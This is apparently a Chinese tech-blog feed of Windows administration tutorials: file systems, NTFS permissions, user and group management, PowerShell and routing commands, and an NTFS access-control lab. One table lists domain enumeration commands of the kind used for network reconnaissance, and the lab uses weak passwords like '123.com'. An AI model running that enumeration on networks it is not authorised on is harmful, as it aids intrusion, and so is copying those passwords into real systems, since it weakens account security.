        <content type="html"><![CDATA[<h1 id="0x01-文件系统概念"><a href="#0x01-文件系统概念" class="headerlink" title="0x01 文件系统概念"></a>0x01 文件系统概念</h1><p>​        <strong>文件系统</strong>是操作系统用于明确存储设备（常见的是磁盘，也有基于NAND Flash的固态硬盘）或分区上的文件的方法和数据结构，即在存储设备上组织文件的方法。操作系统中负责管理和存储文件信息的软件机构称为文件管理系统，简称文件系统。<font color="red">文件系统是硬盘空间存储数据的一套科学合理的存储和管理方法。</font></p><h1 id="0x02-常见文件系统"><a href="#0x02-常见文件系统" class="headerlink" title="0x02 常见文件系统"></a>0x02 常见文件系统</h1><h2 id="FAT文件系统（windows）"><a href="#FAT文件系统（windows）" class="headerlink" title="FAT文件系统（windows）"></a>FAT文件系统（windows）</h2><p>​        FAT(<code>File Allocation Table</code>)文件系统诞生于1977年，它最初是为软盘设计的文件系统，但是后来随着微软推出<code>dos</code>和<code>win 9x</code>系统，FAT文件系统经过适配被逐渐用到了硬盘上，并且在那时的20年中，一直是主流的文件系统.（<code>FAT16 32 64</code>）</p><p><strong>特点</strong>：</p><ol><li>单个文件最大为4G</li><li>最大文件数量268,435,437</li><li>分区最大容量8TB</li><li>可在多种操作系统读写</li></ol><h2 id="NTFS文件系统（windows）"><a href="#NTFS文件系统（windows）" class="headerlink" title="NTFS文件系统（windows）"></a>NTFS文件系统（windows）</h2><p>​        NTFS全称是<code>New Technology File System</code>，它是一种比FAT32功能更加强大的文件系统。<br>从windows 2000之后的windows系统的默认文件系统都是NTFS，而且这些windows系统只能够安装在NTFS格式的磁盘上。</p><p><strong>特点</strong>：</p><ol><li>理论上最大文件尺寸可达<code>16EB-1KB</code>，实际上有<code>16TB-64KB(1EB = 1024PB 1PB = 1024TB)</code></li><li>操作系统支持大部分windows系统，Unix／Linux系统，Mac OS（在Mac OS 10.4+系统上，NTFS格式是只读的，即在Mac系统下，你只能从NTFS格式的磁盘上读取数据，而不能写入数据）</li><li>由于在Mac系统下，NTFS是只读的，所以要想在Mac下想要在NTFS格式的硬盘写入数据，要装一个插件<code>Paragon NTFS</code>，但不是太稳定</li></ol><h2 id="ExFAT（windows-MACos-linux）"><a href="#ExFAT（windows-MACos-linux）" class="headerlink" title="ExFAT（windows MACos linux）"></a>ExFAT（windows MACos linux）</h2><p>​        ExFAT(Extended File Allocation Table)又叫FAT64，看名字就知道它是对FAT文件系统的扩展。</p><p><strong>特点</strong>：</p><ol><li>ExFAT是虽然也是微软开发的文件系统，但说它是windows下的文件系统并不合适，它是专门为闪存盘设计的文件系统，单个文件突破了4G的限制，而且分区的最大容量可达64ZB（比EB大一级的），建议512TB</li><li>ExFAT在windows，Linux以及Mac系统上，都可以读写，作为U盘或者是移动硬盘的格式还是比较合适的。</li></ol><h2 id="HFS-HFS-（MAC-OS专用）"><a href="#HFS-HFS-（MAC-OS专用）" class="headerlink" title="HFS/HFS+（MAC OS专用）"></a>HFS/HFS+（MAC OS专用）</h2><p>​        HFS全称叫分层文件系统（<code>Hierarchical File System，HFS</code>），诞生于1985年，最初被设计用于软盘和硬盘，同时也可以在在只读媒体如CD-ROM上见到。</p><h2 id="EXT（3，4）（linux）"><a href="#EXT（3，4）（linux）" class="headerlink" title="EXT（3，4）（linux）"></a>EXT（3，4）（linux）</h2><p>​        Ext3是一种日志式文件系统,其最大的特点就是：它会将整个磁盘的写入动作完整的记录在磁盘的某个区域上，以便有需要时回溯追踪。当在某个过程中断时，系统可以根据这些记录直接回溯并重整被中断的部分，重整速度相当快。</p><h2 id="XFS（linux）"><a href="#XFS（linux）" class="headerlink" title="XFS（linux）"></a>XFS（linux）</h2><p>​        XFS文件系统是RHEL7系列的默认文件系统，目的是为了替代传统的EXT4文件系统.</p><p><strong>特点</strong>：</p><ol><li><strong>数据完全性</strong><br>采用XFS文件系统，当意想不到的宕机发生后，首先，由于文件系统开启了日志功能，所以你磁盘上的文件不再会意外宕机而遭到破坏了。不论目前文件系统上存储的文件与数据有多少，文件系统都可以根据所记录的日志在很短的时间内迅速恢复磁盘文件内容。</li><li><strong>传输特性</strong><br>XFS文件系统采用优化算法，日志记录对整体文件操作影响非常小。XFS查询与分配存储空间非常快。<code>xfs</code>文件系统能连续提供快速的反应时间。笔者曾经对<code>XFS、JFS、Ext3、ReiserFS</code>文件系统进行过测试，XFS文件文件系统的性能表现相当出众。</li><li><strong>可扩展性</strong><br>XFS 是一个全<code>64-bit</code>的文件系统，它可以支持上百万T字节的存储空间。对特大文件及小尺寸文件的支持都表现出众，支持特大数量的目录。最大可支持的文件大 小为<code>263 = 9 x 1018 = 9 exabytes</code>，最大文件系统尺寸为<code>18 exabytes</code>。<br>XFS使用高的表结构(B+树)，保证了文件系统可以快速搜索与快速空间分配。XFS能够持续提供高速操作，文件系统的性能不受目录中目录及文件数量的限制。</li><li><strong>传输带宽</strong><br>XFS 能以接近裸设备I/O的性能存储数据。在单个文件系统的测试中，其吞吐量最高可达7GB每秒，对单个文件的读写操作，其吞吐量可达4GB每秒。</li></ol><h1 id="0x03-NTFS相对于FAT的优势"><a href="#0x03-NTFS相对于FAT的优势" class="headerlink" title="0x03 NTFS相对于FAT的优势"></a>0x03 NTFS相对于FAT的优势</h1><h2 id="容错性"><a href="#容错性" class="headerlink" title="容错性"></a>容错性</h2><p>​        NTFS文件系统可以自动地修复磁盘错误而不会显示出错信息。</p><p>​        <code>WindowsNT/2000/XP</code>向NTFS分区中写入文件时，会在内存中保留文件的一份拷贝，然后检查，磁盘中写入的文件与内存中保留的拷贝是否一致。如果两者不一致，Windows就把相应的扇区标为坏扇区而不再使用它（即簇重映射），然后，用内存中保留的文件拷贝重新向磁盘上写文件。如果在读文件时出现错误，NTFS返回一个读错误信息，并告知相应的应用程序数据已经丢失。</p><h2 id="安全性（NTFS权限）"><a href="#安全性（NTFS权限）" class="headerlink" title="安全性（NTFS权限）"></a>安全性（NTFS权限）</h2><p>​        NTFS有许多安全性能方面的选项，可以在本机上和通过远程的方法保护文件及目录。NTFS还支持加密文件系统EFS（<code>Encrypting   File System</code>），可以阻止没有授权的用户访问文件。也可以通过设置NTFS，限制用户的访问。</p><h2 id="文件压缩"><a href="#文件压缩" class="headerlink" title="文件压缩"></a>文件压缩</h2><p>​        NTFS支持文件压缩功能，用户可以选择压缩单个文件或整个文件夹。</p><h2 id="磁盘配额"><a href="#磁盘配额" class="headerlink" title="磁盘配额"></a>磁盘配额</h2><p>​        磁盘配额功能允许系统管理员管理分配给各个用户的磁盘空间，合法用户只能访问属于自己的文件，<code>Windows NT/2000/XP</code>中的磁盘配额功能是基于用户和卷（<code>Windows NT/2000/XP</code>下文件系统以卷为单位划分，相当于<code>Windows 95/98/Me</code>下逻辑分区的概念）的所谓磁盘配额，就是管理员可以对本域中的每个用户所能使用的磁盘空间进行配额限制，即每个用户只能使用最大配额范围内的磁盘空间.</p><h1 id="0x04-NTFS权限应用规则"><a href="#0x04-NTFS权限应用规则" class="headerlink" title="0x04 NTFS权限应用规则"></a>0x04 NTFS权限应用规则</h1><ol><li><p><strong>默认继承</strong><br>默认文件或是文件夹继承父级文件夹的权限。</p></li><li><p><strong>权限不冲突累加</strong><br>当一个用户同时有两个权限（同时属于两个组），且不冲突时，两个权限累加。</p></li><li><p><strong>权限冲突，拒绝优先</strong><br>当一个用户同时有两个权限（同时属于两个组），权限冲突时，拒绝权限生效。</p></li><li><p><strong>特殊权限</strong></p><ul><li>读取权限的权限</li><li>更改权限的权限</li><li>取得所有权的权限</li></ul></li><li><p><strong>阻止继承</strong></p><p>在Windows中用文件或文件夹的高级安全属性界面中可以阻止从父文件夹中继承的权限</p></li><li><p><strong>强制继承</strong></p><p>在Windows中文件夹的高级安全属性界面中可以设置子类强制继承父文件夹的权限</p></li></ol><p>注：</p><ul><li><font color="red">强制继承和阻止继承在的生效取决于那个设置后被操作</font>。</li><li><font color="red">在Windows中文件或文件夹权限的设置对管理员无效，管理员可以强制获取权限。</font></li></ul><h1 id="0x05-NTFS权限基本设置"><a href="#0x05-NTFS权限基本设置" class="headerlink" title="0x05 NTFS权限基本设置"></a>0x05 NTFS权限基本设置</h1><ol><li><p><strong>阻止权限继承</strong>。文件或文件夹右键选择属性 → 选择【安全】选项卡 → 点击【高级】按钮 → 点击【更改权限】按钮 → 取消勾选【…继承权限】。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/NTFS/阻止权限继承.png" alt="阻止权限继承"></center></li><li><p><strong>强制权限继承</strong>。文件或文件夹右键选择属性 → 选择【安全】选项卡 → 点击【高级】按钮 → 点击【更改权限】按钮 → 勾选【使用可从此对象继承的权限替换所有对象权限】。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/NTFS/强制权限继承.png" alt="强制权限继承"></center></li></ol><h1 id="0x06-实验练习"><a href="#0x06-实验练习" class="headerlink" title="0x06 实验练习"></a>0x06 实验练习</h1><ul><li><a href="https://z1r0s.github.io/2020/11/05/windows-fang-wen-kong-zhi-lie-biao-pei-zhi-shi-yan/">Windows访问控制列表配置实验</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 文件系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows用户和组管理</title>
      <link href="/2020/11/06/windows-yong-hu-he-zu-guan-li/"/>
      <url>/2020/11/06/windows-yong-hu-he-zu-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="SID"><a href="#SID" class="headerlink" title="SID"></a>SID</h1><p>​        每个用户账户拥有唯一的<strong>安全标识符</strong>，用来记录用户的权限</p><p>组成：</p><ul><li><code>SID = Windows ID  +  用户的相对ID</code></li><li><code>Windows  ID</code>：在安装Windows 的过程每台计算机都会产生不同的<code>WindowsID</code>（<font color="blue">克隆的新虚拟机与原虚拟机SID相同</font>）</li><li><code>相对ID(用户ID)</code>： <font color="red">500 </font>是<code>Administrator</code>账户的相对ID ；新建的第一个用户是<font color="red">1000</font>，第二个是<font color="red">1001</font>，依次类推。</li></ul><p>举个栗子：</p><pre class=" language-shell"><code class="language-shell">S-1-5-21-2884017511-3916249987-3152507841-1001WIndows-ID：S-1-5-21-2884017511-3916249987-3152507841User-ID：1001</code></pre><h1 id="账户分类"><a href="#账户分类" class="headerlink" title="账户分类"></a>账户分类</h1><h2 id="1-与使用者相关联的账户"><a href="#1-与使用者相关联的账户" class="headerlink" title="1. 与使用者相关联的账户"></a>1. 与使用者相关联的账户</h2><ul><li><code>Administrator</code>：默认管理员账户（使用者中权限最高）</li><li><code>Guest</code>： 访客使用（默认禁用）</li></ul><h2 id="2-与Windows-组件关联的账户"><a href="#2-与Windows-组件关联的账户" class="headerlink" title="2. 与Windows 组件关联的账户"></a>2. 与Windows 组件关联的账户</h2><ul><li><code>SYSTEM</code> ：本地系统账户；为Windows 核心组件访问文件提供权限   （拥有高于Administrator的权限）</li><li><code>Local  Service</code>：本地服务， 一部分服务提供访问系统权限  ；权限非常低</li><li><code>Network  Service</code> ：（网络服务， 一部分网络提供访问系统的权限；权限非常低<h1 id="用户管理相关操作"><a href="#用户管理相关操作" class="headerlink" title="用户管理相关操作"></a>用户管理相关操作</h1></li></ul><h2 id="图形化界面管理用户"><a href="#图形化界面管理用户" class="headerlink" title="图形化界面管理用户"></a>图形化界面管理用户</h2><ol><li><p><strong>新建test用户</strong>。服务器管理器 → 配置 → 本地用户和组 → 用户 → 右键选择【新用户…】选项。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/ManagerUserAndGroup/新建test用户.png" alt="新建test用户"></center></li><li><p><strong>删除test用户</strong>。服务器管理器 → 配置 → 本地用户和组 → 用户 → 选中test用户右键选择【删除】选项。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/ManagerUserAndGroup/删除test用户.png" alt="删除test用户"></center></li></ol><h2 id="命令行界面管理用户"><a href="#命令行界面管理用户" class="headerlink" title="命令行界面管理用户"></a>命令行界面管理用户</h2><pre class=" language-shell"><code class="language-shell">1.查看所有用户net user查看admin用户信息net user admin2.启用或禁用指定用户：-- 启用admin用户net user admin /active:yes # 启用-- 禁用admin用户net user admin /active:no    # 禁用3.命令创建用户-- 创建用户zhangsan密码为123.comnet user zhangsan 123.com /add 4.命令重置用户密码-- 将zhangsan用户密码重置位空net user zhangsan ""5.修改用户密码-- 将admin用户的密码修改为123@qq.comnet user admin 123@qq.com6.命令删除用户-- 删除zhangsan用户net user zhangsan /del 5.将用户加入指定组qq.com-- 将zhangsanj加入administrators管理组net localgroup administrators zhangsan /add</code></pre><h1 id="组的定义"><a href="#组的定义" class="headerlink" title="组的定义"></a>组的定义</h1><p>​        一些账户的集合，为“组”设置权限后，隶属于该组的账户默认具有这些权限，方便管理</p><h1 id="组的分类"><a href="#组的分类" class="headerlink" title="组的分类"></a>组的分类</h1><h2 id="1-需要人为添加成员的组"><a href="#1-需要人为添加成员的组" class="headerlink" title="1. 需要人为添加成员的组"></a>1. 需要人为添加成员的组</h2><ul><li><code>Administrators</code>组：默认管理员组  （<font color="blue">可以将账户加入该组让用户具有管理员权限）</font></li><li><code>Guests</code>组：默认来宾组</li><li><code>Power  Users</code>组：Windows Server 2008上为向下兼容保留的组  （不再使用）</li><li><code>Users</code>组：新用户的默认组</li></ul><h2 id="2-动态包含成员的组"><a href="#2-动态包含成员的组" class="headerlink" title="2. 动态包含成员的组"></a>2. 动态包含成员的组</h2><ul><li><code>INTERACTIVE</code>：默认包含在本地登录的账户</li><li><code>Authenticated  Users</code>：包含了通过验证的账户，不包含来宾用户</li><li><code>Everyone</code>：所有账户  （设置开放权限时使用）</li></ul><h1 id="组的相关操作"><a href="#组的相关操作" class="headerlink" title="组的相关操作"></a>组的相关操作</h1><h2 id="图形化管理用户"><a href="#图形化管理用户" class="headerlink" title="图形化管理用户"></a>图形化管理用户</h2><ol><li><p><strong>新建tests组</strong>。服务器管理器 → 配置 → 本地用户和组 → 组 → 右键选择【新建组…】选项。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/ManagerUserAndGroup/新建组.png" alt="新建组"></center></li><li><p><strong>删除tests组</strong>。服务器管理器 → 配置 → 本地用户和组 → 组 → 选中tests组右键选择【删除】选项。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/ManagerUserAndGroup/删除组.png" alt="删除组"></center></li></ol><h2 id="命令管理用户"><a href="#命令管理用户" class="headerlink" title="命令管理用户"></a>命令管理用户</h2><pre class=" language-shell"><code class="language-shell">1.    命令创建组-- 创建jishubu组net localgroup jishubu /add 2.    命令删除组-- 删除jishubu组net localgroup jishubu /del3.    命令添加用户到指定组-- 将zhangsanj加入administrators管理组net localgroup administrators zhangsan /add4.  把指定用户踢出组-- 将用户zhangsan踢出administrators组net localgroup administrators zhangsan /del</code></pre><h1 id="实验练习"><a href="#实验练习" class="headerlink" title="实验练习"></a>实验练习</h1><ul><li><a href="https://z1r0s.github.io/2020/11/05/windows-fang-wen-kong-zhi-lie-biao-pei-zhi-shi-yan/">Windows访问控制列表配置实验</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 用户管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域操作命令</title>
      <link href="/2020/11/05/yu-cao-zuo-ming-ling/"/>
      <url>/2020/11/05/yu-cao-zuo-ming-ling/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">命令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>dsquery server</code></td><td align="center">得到域控制器的主机名（服务器中才可执行）</td></tr><tr><td align="center"><code>net group /domain</code></td><td align="center">获得所有域用户组列表</td></tr><tr><td align="center"><code>net group xxxxx /domain</code></td><td align="center">显示域中xxxxx组的成员</td></tr><tr><td align="center"><code>net group xxxxx /del /domain</code></td><td align="center">删除域中xxxxx组</td></tr><tr><td align="center"><code>net group xxxxx xy /del /domain</code></td><td align="center">删除域内xxxxx 群组中的xy成员</td></tr><tr><td align="center"><code>net group xxxxx /add /domain</code></td><td align="center">增加域中的群组</td></tr><tr><td align="center"><code>net group &quot;domain admins&quot; /domain</code></td><td align="center">获得域管理员列表</td></tr><tr><td align="center"><code>net group &quot;enterprise admins&quot; /domain</code></td><td align="center">获得企业管理员列表</td></tr><tr><td align="center"><code>net localgroup administrators /domain</code></td><td align="center">获取域内置administrators组用（enterprise admins、domain admins）</td></tr><tr><td align="center"><code>net group &quot;domain controllers&quot; /domain</code></td><td align="center">获得域控制器列表</td></tr><tr><td align="center"><code>net group &quot;domain computers&quot; /domain</code></td><td align="center">获得所有域成员计算机列表</td></tr><tr><td align="center"><code>net user /domain</code></td><td align="center">获得所有域用户列表</td></tr><tr><td align="center"><code>net user xxxx /domain</code></td><td align="center">获得指定账户xxxx的详细信息</td></tr><tr><td align="center"><code>net accounts /domain</code></td><td align="center">获得域密码策略设置，密码长短，错误锁定等信息</td></tr><tr><td align="center"><code>net view /domain</code></td><td align="center">查询有几个域, 查询域列表</td></tr><tr><td align="center"><code>net view /domain:xxxx</code></td><td align="center">查看 xxxx域中的计算机列表</td></tr><tr><td align="center"><code>nltest /domain_trusts</code></td><td align="center">获取域信任信息</td></tr><tr><td align="center"><code>net user domain-admin /domain</code></td><td align="center">查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息</td></tr><tr><td align="center"><code>net config Workstation</code></td><td align="center">查询当前登录域</td></tr><tr><td align="center"><code>net time /domian</code></td><td align="center">查询主域服务器的时间</td></tr><tr><td align="center"><code>echo %logonserver%</code></td><td align="center">查看登陆到这台服务器的计算机名</td></tr><tr><td align="center"><code>gpupdate/force</code></td><td align="center">更新域策略</td></tr><tr><td align="center"><code>tasklist /S ip /U domain\username /P /V</code></td><td align="center">查看远程计算机进程列</td></tr><tr><td align="center"><code>wmic qfe</code></td><td align="center">查看补丁信息</td></tr><tr><td align="center"><code>wmic os</code></td><td align="center">查看操作系统类型</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 常用软件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 常用命令 </tag>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PowerShell常用命令</title>
      <link href="/2020/11/05/powershell-chang-yong-ming-ling/"/>
      <url>/2020/11/05/powershell-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">命令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>get-host</code></td><td align="center">查看powershell版本</td></tr><tr><td align="center"><code>$host.version</code></td><td align="center">查看powershell版本</td></tr><tr><td align="center"><code>$PSVersionTable.PSVERSION</code></td><td align="center">查看powershell版本</td></tr><tr><td align="center"><code>new-item test -type directory</code></td><td align="center">新建目录</td></tr><tr><td align="center"><code>new-item test -type file</code></td><td align="center">新建文件</td></tr><tr><td align="center"><code>remove-item 文件或目录</code></td><td align="center">删除文件或目录</td></tr><tr><td align="center"><code>get-content 1.txt</code></td><td align="center">显示文件内容</td></tr><tr><td align="center"><code>set-content 1.txt -value &quot;helloworld&quot;</code></td><td align="center">设置文件内容</td></tr><tr><td align="center"><code>add-content 1.txt -value &quot;love&quot;</code></td><td align="center">追加文本内容</td></tr><tr><td align="center"><code>get-executionpolicy</code></td><td align="center">查看powershell执行策略</td></tr><tr><td align="center"><code>set-executionpolicy unrestricted</code></td><td align="center">设置powershell执行策略</td></tr><tr><td align="center"><font color="red">Restricted</font></td><td align="center">为脚本不能运行，是默认设置</td></tr><tr><td align="center"><font color="red">Unrestricted </font></td><td align="center">为允许所有的脚本运行</td></tr><tr><td align="center"><font color="red">RemoteSigned</font></td><td align="center">为只能运行本地创建的脚本，不能运行从网上下载的脚本，除了有数字签名证书</td></tr><tr><td align="center"><font color="red">Allsigned</font></td><td align="center">为只运行有受信任的发布者签名的脚本</td></tr><tr><td align="center"><code>get-process</code></td><td align="center">获取所有进程</td></tr><tr><td align="center">Set-Alias aaa get-process</td><td align="center">给命令起别名</td></tr><tr><td align="center"><code>Get-Command</code></td><td align="center">查看当前作用域支持的所有命令</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 常用软件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 常用命令 </tag>
            
            <tag> Windows </tag>
            
            <tag> PowerShell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由查询常用命令</title>
      <link href="/2020/11/05/lu-you-cha-xun-chang-yong-ming-ling/"/>
      <url>/2020/11/05/lu-you-cha-xun-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">命令</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>tracert IP</code></td><td align="center">路由追踪</td></tr><tr><td align="center"><code>route print</code></td><td align="center">打印路由表</td></tr><tr><td align="center"><code>arp -a</code></td><td align="center">列出本网段内所有活跃的IP地址</td></tr><tr><td align="center"><code>arp -s (ip + mac)</code></td><td align="center">绑定mac与ip地址</td></tr><tr><td align="center"><code>arp -d (ip + mac)</code></td><td align="center">解绑mac与ip地址</td></tr><tr><td align="center"><code>netsh firewall show config</code></td><td align="center">查看防火墙策略</td></tr><tr><td align="center"><code>netsh firewall show state</code></td><td align="center">查看防火墙状态</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 常用软件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 常用命令 </tag>
            
            <tag> 路由 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows访问控制列表配置实验</title>
      <link href="/2020/11/05/windows-fang-wen-kong-zhi-lie-biao-pei-zhi-shi-yan/"/>
      <url>/2020/11/05/windows-fang-wen-kong-zhi-lie-biao-pei-zhi-shi-yan/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-实验要求"><a href="#0x01-实验要求" class="headerlink" title="0x01 实验要求"></a>0x01 实验要求</h1><ol><li>所有部门的员工智能进入本部门文件夹和public</li><li>每个部门的部门经理对部门有写入权限，部门员工只能读取</li><li>总经理可以参与所有的部门，也可以完全控制</li><li>public文件夹，所有员工可以读取，经理可以写入</li></ol><h1 id="0x02-实验分析"><a href="#0x02-实验分析" class="headerlink" title="0x02 实验分析"></a>0x02 实验分析</h1><p><code>public</code>文件夹访问规则，总经理、技术经理、财务经理、销售经理具有完全读写、修改权限；技术部员工、财务部员工、销售部员工只能查看。</p><p><code>jishubu</code>文件夹访问规则，总经理、技术经理具有完全读写、修改权限；仅技术部员工具有查看权限。</p><p><code>caiwubu</code>文件夹访问规则，总经理、财务经理具有完全读写、修改权限；仅财务部员工具有查看权限。</p><p><code>xiaoshoubu</code>文件夹访问规则，总经理、销售经理具有完全读写、修改权限；仅销售部员工具有查看权限。</p><p>综合以上创建<strong>技术部、财务部、销售部、经理</strong>组，其中组内包含如下</p><ul><li>技术部：技术经理、技术员工</li><li>财务部：财务经理、财务员工</li><li>销售部：销售经理、销售员工</li><li>经理：总经理、销售经理、技术经理、财务经理</li></ul><p>文件夹权限设置：</p><ul><li><code>public</code>：经理组<strong>读写</strong>权限、技术部<strong>读</strong>权限、财务部<strong>读</strong>权限、销售部<strong>读</strong>权限</li><li><code>jishubu</code>：技术部组<strong>读</strong>权限、技术经理<strong>读写</strong>权限、总经理<strong>读写</strong>权限</li><li><code>caiwubu</code>：财务部组<strong>读</strong>权限、财务经理<strong>读写</strong>权限、总经理<strong>读写</strong>权限</li><li><code>xiaoshoubu</code>：销售部组<strong>读</strong>权限、销售经理<strong>读写</strong>权限、总经理<strong>读写</strong>权限</li></ul><h1 id="0x03-实验步骤"><a href="#0x03-实验步骤" class="headerlink" title="0x03 实验步骤"></a>0x03 实验步骤</h1><ol><li><p>创建用户、组并将用户划分到指定的组中。</p><pre class=" language-shell"><code class="language-shell"># 创建组net localgroup jishubu /addnet localgroup caiwubu /addnet localgroup xiaoshoubu /addnet localgroup jingli /add# 创建用户net user jishubujl 123.com /addnet user jishubuyg 123.com /addnet user caiwubujl 123.com /addnet user caiwubuyg 123.com /addnet user xiaoshoubujl 123.com /addnet user xiaoshoubuyg 123.com /addnet user zongjingli 123.com /add# 划分用户到组中net localgroup jishubu jishubujl /addnet localgroup jishubu jishubuyg /addnet localgroup caiwubu caiwubujl /addnet localgroup caiwubu caiwubuyg /addnet localgroup xiaoshoubu xiaoshoubujl /addnet localgroup xiaoshoubu xiaoshoubuyg /addnet localgroup jingli zongjingli /addnet localgroup jingli jishubujl /addnet localgroup jingli caiwubujl /addnet localgroup jingli xiaoshoubujl /add</code></pre></li><li><p>设置<code>public</code>文件夹权限。打开属性界面在安全的高级属性界面中<strong>取消继承权限</strong>，再删除无用组<strong>添加目的组或用户并设置相关权限</strong>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WindowsAccessControl/public文件权限设置.gif" alt="public文件权限设置"></center></li><li><p>设置<code>jishubu</code>文件夹权限。打开属性界面在安全的高级属性界面中<strong>取消继承权限</strong>，再删除无用组<strong>添加目的组或用户并设置相关权限</strong>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WindowsAccessControl/jishubu文件权限设置.gif" alt="jishubu文件权限设置"></center></li><li><p>设置<code>caiwubu</code>文件夹权限。打开属性界面在安全的高级属性界面中<strong>取消继承权限</strong>，再删除无用组<strong>添加目的组或用户并设置相关权限</strong>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WindowsAccessControl/caiwubu文件权限设置.gif" alt="caiwubu文件权限设置"></center></li><li><p>设置<code>xiaoshoubu</code>文件夹权限。打开属性界面在安全的高级属性界面中<strong>取消继承权限</strong>，再删除无用组<strong>添加目的组或用户并设置相关权限</strong>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WindowsAccessControl/xiaoshoubu文件权限设置.gif" alt="xiaoshoubu文件权限设置"></center></li></ol><h1 id="0x04-实验结果"><a href="#0x04-实验结果" class="headerlink" title="0x04 实验结果"></a>0x04 实验结果</h1><ol><li><p>切换<code>caiwubujl</code>用户登录并查看对<code>caiwubu</code>文件夹的访问权限，结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WindowsAccessControl/caiwubujl访问caiwubu.png" alt="caiwubujl访问caiwubu"></center></li><li><p><code>caiwubujl</code>用户访问<code>jishubu</code>文件夹，访问结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WindowsAccessControl/caiwubujl访问jishubu文件夹.png" alt="caiwubujl访问jishubu文件夹"></center></li><li><p><code>caiwubujl</code>操作<code>public</code>文件夹，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WindowsAccessControl/caiwubujl访问public文件夹.png" alt="caiwubujl访问public文件夹"></center></li><li><p>切换<code>caiwubuyg</code>用户访问<code>caiwubu</code>文件夹，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WindowsAccessControl/caiwubuyg访问caiwubu文件夹.png" alt="caiwubuyg访问caiwubu文件夹"></center></li><li><p><code>caiwubuyg</code>用户访问<code>jishubu</code>文件夹，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WindowsAccessControl/caiwubuyg访问jishubu文件夹.png" alt="caiwubuyg访问jishubu文件夹"></center></li><li><p><code>caiwubuyg</code>用户访问<code>public</code>文件夹，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WindowsAccessControl/caiwubuyg在public文件夹中创建.png" alt="caiwubuyg在public文件夹中创建"></center></li><li><p>切换<code>zongjingli</code>用户访问<code>caiwubu</code>文件夹，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WindowsAccessControl/zongjingli访问caiwubu.png" alt="zongjingli访问caiwubu"></center></li><li><p><code>zongjingli</code>用户访问<code>jishubu</code>文件夹，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WindowsAccessControl/zongjingli在jishubu文件夹中创建操作.png" alt="zongjingli在jishubu文件夹中创建操作"></center></li><li><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WindowsAccessControl/总经理访问public文件夹.png" alt="总经理访问public文件夹"></center></li></ol><h1 id="0x05-实验总结"><a href="#0x05-实验总结" class="headerlink" title="0x05 实验总结"></a>0x05 实验总结</h1><ul><li>由操作结果可知上述操作达到实验要求。</li><li>对于文件或文件夹权限设置步骤:<ol><li>确定文件夹的类型（各个用户对该文件夹的访问权限</li><li>确定用户组，将用户划分到组中（需要整体考虑文件数量、扩展性等）</li><li>创建用户、组</li><li>将用户划分到组中</li><li>分别为每个文件夹分配权限</li><li>登录不同账户验证权限设置效果</li></ol></li></ul><h1 id="0x06-附录"><a href="#0x06-附录" class="headerlink" title="0x06 附录"></a>0x06 附录</h1><ul><li><p>还原系统中的用户、组信息</p><pre class=" language-shell"><code class="language-shell"># 删除net localgroup jishubu /delnet localgroup caiwubu /delnet localgroup xiaoshoubu /delnet localgroup jingli /delnet user jishubujl /delnet user jishubuyg /delnet user caiwubujl /delnet user caiwubuyg /delnet user xiaoshoubujl /delnet user xiaoshoubuyg /delnet user zongjingli /del</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 访问控制列表 </tag>
            
